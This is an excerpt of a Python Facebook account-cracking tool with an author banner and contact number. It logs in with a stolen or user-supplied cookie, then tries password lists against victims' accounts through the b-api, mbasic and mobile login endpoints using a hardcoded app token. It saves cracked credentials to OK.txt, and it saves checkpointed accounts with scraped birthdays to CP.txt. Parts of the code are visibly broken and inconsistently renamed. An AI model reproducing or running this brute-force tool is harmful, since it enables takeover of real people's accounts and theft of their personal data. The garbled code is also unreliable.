...
N = '\033[0m'	# WARNA MATI 
def login():
	os.system("rm -rf access_cookie.txt");logo()
	tok = input(' [*] Enter Your cookie : ')
	try:
			u = requests.get('https://graph.facebook.com/me?access_cookie='+tok).text
			u1 = json.loads(u)
			name = u1['name']
			ts = open('access_cookie.txt', 'w')
			ts.write(tok)
			ts.close()
...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#ANCHAL_RAJA ('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			ANCHAL_RAJA (' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							ANCHAL_RAJA ('[•] Result CP saved to CP.txt')
							ANCHAL_RAJA ('\n\tCrack Processing...\n')
							ANCHAL_RAJA ('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					ANCHAL_RAJA ('\n01.) Metode b-api ')
					ANCHAL_RAJA ('02.) Metode mbasic ')
					ANCHAL_RAJA ('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			ANCHAL_RAJA ('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			ANCHAL_RAJA (' [1] ANCHAL Method 1 ')
			ANCHAL_RAJA (' [2] ANCHAL Method 2  [ Pro ]')
			ANCHAL_RAJA (' [3] ANCHAL Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			try:
				...
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			p = Prof_IMtiaz("https://b-api.facebook.com/method/auth.login?access_cookie=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
			if "access_cookie" in p:
				ANCHAL_RAJA ('\r\033[1;92m[Successful-AKING] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					cp_ttl = Prof_Imtiaz('https://graph.facebook.com/%s?access_cookie=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					ANCHAL_RAJA ('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				ANCHAL_RAJA ('\r\033[1;91m[Checkpoint-AKING] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				ANCHAL_RAJA ('\r\033[1;32m[Successful-AKING] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_cookie=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].ANCHAL_RAJA ('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				ANCHAL_RAJA ('\r\033[1;92m[Successful-ANCHAL] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					cookie = IMTIAZ('cookie.txt').read()
					cp_ttl = Prof_Aking('https://graph.facebook.com/%s?access_cookie=%s'%(user,cookie)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					ANCHAL_RAJA ('\r\033[1;91m[Checkpoint-AKING] %s | %s  %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					...
					pass
				ANCHAL_RAJA ('\r\033[1;91m[Checkpoint-ANCHAL] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
...
O))         O))O)))  O))   O)))O))  O))  O)) O)))O)))       O))      O))  O)) O)))   O))  O)) O)))
 ...
 [*]=============================================
    Author   : ÃÑÇHÃL RÃJÃ 
    Facebook : https://facebook.com/ÃÑÇHÃL RÃJÃ 
    Team     : ANCHAL + SAHIL
    Connect  :+91 9149858868
 [*]=============================================
...
def dupcutter():
	os.system("xdg-open https://wa.me/+919149858868")
	time.sleep(3)
	readline___Public_Xml()
def sep():
	logo()
